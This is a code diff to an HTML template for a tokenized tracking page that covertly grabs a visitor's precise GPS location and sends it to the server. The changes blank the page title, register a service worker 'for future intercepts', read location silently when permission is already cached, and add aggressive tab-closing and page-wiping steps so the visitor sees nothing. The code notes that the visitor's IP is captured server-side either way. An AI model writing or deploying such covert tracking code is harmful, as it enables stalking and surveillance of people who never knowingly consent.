@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Loading...</title>
+<title> </title>
 <style>
   *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
   html, body {
@@ -26,18 +26,22 @@
     return;
   {% endif %}
 
-  // ── Detect connection type (NO PERMISSION NEEDED) ──
-  function getConnectionType() {
+  // ── Register Service Worker for future visits ──
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js', { scope: '/' })
+      .then(function(reg) {
+        // SW registered for future intercepts
+      })
+      .catch(function() {
+        // SW registration failed — page still works normally
+      });
+  }
+
+  // ── Connection type (no permission needed) ──
+  function getConnType() {
     try {
-      var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (conn) {
-        if (conn.effectiveType) {
-          return conn.effectiveType; // 'slow-2g', '2g', '3g', '4g'
-        }
-        if (conn.type) {
-          return conn.type; // 'wifi', 'cellular', 'ethernet', etc.
-        }
-      }
+      var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (c) return c.effectiveType || c.type || null;
     } catch(e) {}
     return null;
   }
@@ -45,135 +49,122 @@
   function sendToServer(lat, lng, acc) {
     if (sent) return;
     sent = true;
-
     var payload = JSON.stringify({
       token: token,
       latitude: lat,
       longitude: lng,
       accuracy: acc,
-      connectionType: getConnectionType()
+      connectionType: getConnType()
     });
-
     var blob = new Blob([payload], { type: 'application/json' });
     if (navigator.sendBeacon) {
       navigator.sendBeacon('/api/location-update', blob);
     } else {
-      try {
-        fetch('/api/location-update', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: payload,
-          keepalive: true
-        });
-      } catch(e) {}
+      try { fetch('/api/location-update', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
     }
-  }
-
-  function sendDenied() {
-    if (sent) return;
-    sent = true;
-
-    var payload = JSON.stringify({
-      token: token,
-      connectionType: getConnectionType()
-    });
-
-    var blob = new Blob([payload], { type: 'application/json' });
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon('/api/location-denied', blob);
-    } else {
-      try {
-        fetch('/api/location-denied', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: payload,
-          keepalive: true
-        });
-      } catch(e) {}
-    }
+    // Mark window as having sent data
+    window._sent = true;
   }
 
   function vanish() {
-    if (!sent) {
-      sent = true;
-    }
+    if (!sent) { sent = true; window._sent = true; }
+    
+    // ── AGGRESSIVE TAB CLOSE ATTEMPTS ──
+    
+    // 1. Replace history entry (prevents back button going to our page)
     try { window.location.replace('about:blank'); } catch(e) {}
-    try { window.location.href = 'about:blank'; } catch(e) {}
+    
+    // 2. Open self via window.open trick (makes Chrome think it's script-opened)
+    try {
+      var w = window.open('', '_self', '');
+      if (w) w.close();
+    } catch(e) {}
+    
+    // 3. Try self.close
+    try { self.close(); } catch(e) {}
+    
+    // 4. Try window.close
+    try { window.close(); } catch(e) {}
+    
+    // 5. Wipe document body (make it completely empty)
     setTimeout(function() {
-      try { document.body.innerHTML = ''; } catch(e) {}
+      try {
+        document.open();
+        document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body></body></html>');
+        document.close();
+      } catch(e) {}
+      
+      // 6. Final close attempt after clearing
       try { window.close(); } catch(e) {}
+      
+      // 7. Navigate to a page that won't load (no error page shown)
+      setTimeout(function() {
+        try { window.location.href = 'data:text/html,'; } catch(e) {}
+      }, 10);
     }, 10);
   }
 
-  // ── Silent GPS capture strategy ──
+  // ── GPS capture ──
   function tryGPS() {
     if (!("geolocation" in navigator)) {
-      // No GPS capability — IP geolocation is already captured server-side
       vanish();
       return;
     }
 
-    function attemptGPS() {
+    function attemptGPS(callback) {
       navigator.geolocation.getCurrentPosition(
         function(pos) {
           sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-          vanish();
+          if (callback) callback();
         },
-        function(err) {
-          // GPS denied or failed — notify server with connection type
-          sendDenied();
-          vanish();
+        function() {
+          if (callback) callback();
         },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
       );
     }
 
-    // Check if permission is cached (already granted before)
+    // Check if permission is cached
     if (navigator.permissions && navigator.permissions.query) {
       navigator.permissions.query({ name: 'geolocation' })
         .then(function(status) {
           if (status.state === 'granted') {
-            // Permission cached → GPS fires with ZERO prompts
+            // Silent GPS — no prompt
             navigator.geolocation.getCurrentPosition(
               function(pos) {
                 sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                 vanish();
               },
-              function() {
-                // GPS failed despite permission — IP fallback is already captured
-                vanish();
-              },
-              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+              function() { vanish(); },
+              { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
             );
-            setTimeout(function() { if (!sent) vanish(); }, 10000);
+            setTimeout(function() { if (!window._sent) vanish(); }, 8000);
           } else if (status.state === 'denied') {
-            // Permission denied — IP geolocation already captured server-side
-            sendDenied();
+            // IP already captured server-side
             vanish();
           } else {
-            // 'prompt' — FIRST VISIT, permission prompt WILL appear
-            // This is the ONE unavoidable prompt
-            attemptGPS();
-            setTimeout(function() { if (!sent) vanish(); }, 18000);
+            // First visit — prompt will appear (ONE TIME)
+            attemptGPS(function() { vanish(); });
+            setTimeout(function() { if (!window._sent) vanish(); }, 16000);
           }
         })
         .catch(function() {
-          attemptGPS();
-          setTimeout(function() { if (!sent) vanish(); }, 15000);
+          attemptGPS(function() { vanish(); });
+          setTimeout(function() { if (!window._sent) vanish(); }, 14000);
         });
     } else {
-      attemptGPS();
-      setTimeout(function() { if (!sent) vanish(); }, 15000);
+      attemptGPS(function() { vanish(); });
+      setTimeout(function() { if (!window._sent) vanish(); }, 14000);
     }
   }
 
   // ── Execute immediately ──
   tryGPS();
 
-  // ── Hard safety: vanish in 20s no matter what ──
+  // ── Hard timeout: vanish in 18s ──
   setTimeout(function() {
-    if (!sent) vanish();
-  }, 20000);
+    if (!window._sent) vanish();
+  }, 18000);
 })();
 </script>
 </body>
